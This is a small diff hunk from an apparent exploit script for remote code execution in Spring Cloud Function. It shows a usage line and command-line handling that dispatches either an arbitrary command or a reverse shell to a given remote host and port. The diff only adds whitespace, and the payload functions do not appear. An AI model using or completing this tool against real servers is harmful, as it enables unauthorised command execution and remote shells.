@@ -44,10 +44,12 @@ python3 SpringCloudFunctionRCE.py -u http://127.0.0.1:8080 -r rhost rport
 		if "-c" in sys.argv:
 			command = sys.argv[sys.argv.index("-c")+1]
 			run_rce(url, command)
+
 		elif "-r" in sys.argv:
 			rhost = sys.argv[sys.argv.index("-r")+1]
 			rport = sys.argv[sys.argv.index("-r")+2]
 			get_shell(url, rhost, rport)
+			
 		else:
 			exit(1)
 			
